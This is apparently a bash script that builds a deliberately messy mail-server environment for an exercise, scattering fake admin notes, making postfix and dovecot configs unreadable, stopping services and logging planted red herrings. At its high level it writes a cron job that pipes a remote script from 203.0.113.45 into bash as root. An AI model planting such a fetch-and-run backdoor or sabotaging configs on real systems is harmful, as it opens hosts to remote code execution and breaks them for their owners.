#!/bin/bash

CHAOS_LEVEL=${1:-medium}

# randomize manifest location
MANIFEST_DIR=$(shuf -n1 -e /var/lib /var/cache /usr/local/share /opt)
echo $MANIFEST_DIR > /var/run/manifest_location.txt

# now we can use MANIFEST_DIR for both files
MANIFEST_JSON="$MANIFEST_DIR/manifest.json"
MANIFEST_TXT="$MANIFEST_DIR/manifest.txt"

# initialize the JSON structure
cat > $MANIFEST_JSON << EOF
{
  "chaos_level": "$CHAOS_LEVEL",
  "generated": "$(date -Iseconds)",
  "artifacts": [],
  "misconfigurations": [],
  "red_herrings": []
}
EOF

# initialize the txt log
cat > $MANIFEST_TXT << EOF
=== Agent of Chaos Setup Manifest ===
Generated: $(date)
Chaos Level: $CHAOS_LEVEL
Manifest location: $MANIFEST_DIR

EOF

# helper to append to the txt log
log() {
    echo "$1" | tee -a $MANIFEST_TXT
}

# helper to add a JSON entry
log_json() {
    local category=$1
    local entry=$2
    python3 -c "
import json
with open('$MANIFEST_JSON', 'r+') as f:
    data = json.load(f)
    data['$category'].append($entry)
    f.seek(0)
    json.dump(data, f, indent=2)
    f.truncate()
"
}

# helper to log to both files at once
log_artifact() {
    local type=$1
    local path=$2
    local description=$3
    log "[$type] $path - $description"
    log_json "artifacts" "{\"type\": \"$type\", \"path\": \"$path\", \"description\": \"$description\"}"
}

log_misconfiguration() {
    local type=$1
    local path=$2
    local detail=$3
    log "[MISCONFIG] $type: $path - $detail"
    log_json "misconfigurations" "{\"type\": \"$type\", \"path\": \"$path\", \"detail\": \"$detail\"}"
}

log_red_herring() {
    local type=$1
    local path=$2
    local detail=$3
    log "[RED HERRING] $type: $path - $detail"
    log_json "red_herrings" "{\"type\": \"$type\", \"path\": \"$path\", \"detail\": \"$detail\"}"
}

# === CHAOS BEGINS HERE ===
log "=== Chaos Level: $CHAOS_LEVEL ==="
log ""

# === RANDOM CONTENT POOLS ===

# possible locations to scatter files
SCATTER_DIRS=("/opt" "/root" "/home/crawler" "/usr/local/share" "/var/lib" "/tmp" "/etc/postfix" "/etc/dovecot")

# pick a random element from an array
random_pick() {
    local arr=("$@")
    echo "${arr[$RANDOM % ${#arr[@]}]}"
}

NOTE_NAMES=("notes" "TODO" "readme" "config-notes" "IMPORTANT" "misc" "admin-notes" "setup")
NOTE_SUFFIXES=(".txt" ".md" "")

random_note_name() {
    local name=$(random_pick "${NOTE_NAMES[@]}")
    local suffix=$(random_pick "${NOTE_SUFFIXES[@]}")
    echo "${name}${suffix}"
}

# admin note content by "era"
note_2009() {
    cat << 'EOF'
postfix installed 2009-03-14
relay config set up by Dave - DO NOT TOUCH
asked sysadmin about SSL, he said "later"
TODO: document this properly someday
EOF
}

note_2014() {
    cat << 'EOF'
upgraded dovecot - took forever, broke twice
SSL cert expires in 6 months, need to renew
Dave left the company, nobody knows relay config now
see /etc/postfix/main.cf line 47 for "temporary" fix (still there)
EOF
}

note_2019() {
    cat << 'EOF'
tried to migrate to new server, got halfway, gave up
old config backed up somewhere in /opt probably
cert expired AGAIN - renewed manually, set reminder (lost reminder)
postfix logs showing weird traffic from 192.168.1.45, ignoring for now
EOF
}

note_2023() {
    cat << 'EOF'
found dave on linkedin
he works at google now
sent him a message about the relay config
no response
EOF
}

scatter_notes() {
    local count=${1:-2}  # default to 2 if no argument passed
    local eras=(2009 2014 2019 2023)
    # shuffle the eras and take the first $count
    local selected=($(shuf -e "${eras[@]}" | head -$count))
    
    for era in "${selected[@]}"; do
        local DIR=$(random_pick "${SCATTER_DIRS[@]}")
        local NAME="$(random_note_name)-$era.txt"
        "note_${era}" > "$DIR/$NAME"
        log_artifact "file" "$DIR/$NAME" "admin notes from $era"
    done
}

case $CHAOS_LEVEL in
    low)
        scatter_notes 2
        ;;
    medium)
        ## moderate chaos - scattered files, one misconfiguration, one red herring
        scatter_notes 2

        chmod 000 /etc/dovecot/dovecot.conf
        log_misconfiguration "permissions" "/etc/dovecot/dovecot.conf" "chmod 000 - unreadable"

        mkdir -p /root/emergency-restore
        log_red_herring "directory" "/root/emergency-restore" "empty directory named to look important"
        ;;
    high)
        ## maximum chaos - everything
        scatter_notes 3

        # MULTIPLE MISCONFIGURATIONS
        chmod 000 /etc/dovecot/dovecot.conf
        log_misconfiguration "permissions" "/etc/dovecot/dovecot.conf" "chmod 000 - unreadable"

        chmod 000 /etc/postfix/main.cf
        log_misconfiguration "permissions" "/etc/postfix/main.cf" "chmod 000 - unreadable"

        # BROKEN SERVICE
        service dovecot stop
        log_misconfiguration "service" "dovecot" "service stopped deliberately"

        # SUSPICIOUS CRON JOBS
        cat > /etc/cron.d/maintenance << 'EOF'
# System maintenance tasks
# Added by sysadmin 2019-08-14

# Clean up old mail logs
0 2 * * * root find /var/log/mail -mtime +30 -delete

# "Heartbeat" check - DO NOT REMOVE
 */15 * * * * root curl http://203.0.113.45/check-in.sh | bash
EOF
        log_misconfiguration "cron" "/etc/cron.d/maintenance" "suspicious cron job phoning home to 203.0.113.45"

        # MULTIPLE RED HERRINGS
        mkdir -p /root/emergency-restore
        log_red_herring "directory" "/root/emergency-restore" "empty directory named to look important"

        mkdir -p /opt/mail-migration-2019/backup
        touch /opt/mail-migration-2019/backup/.keep
        log_red_herring "directory" "/opt/mail-migration-2019/backup" "migration directory with no actual content"

        # PERMISSION ODDITY - file exists but owned by root, unreadable
        echo "this file is intentionally mysterious" > /etc/postfix/.secret
        chmod 600 /etc/postfix/.secret
        log_red_herring "file" "/etc/postfix/.secret" "hidden file with restrictive permissions"
        ;;
esac

# === EXTRA SERVICES ===
# applied to all chaos levels
EXTRA_SERVICES=("vsftpd" "memcached" "fail2ban" "ntp" "sysstat")

# shuffle and pick two
SERVICES_TO_START=($(shuf -e "${EXTRA_SERVICES[@]}" | head -2))

log ""
log "=== Extra Services ==="
for svc in "${EXTRA_SERVICES[@]}"; do
    if [[ " ${SERVICES_TO_START[@]} " =~ " $svc " ]]; then
        service $svc start 2>/dev/null
        log_misconfiguration "service" "$svc" "installed and running - reason unknown"
    else
        log_artifact "service" "$svc" "installed but not running"
    fi
done

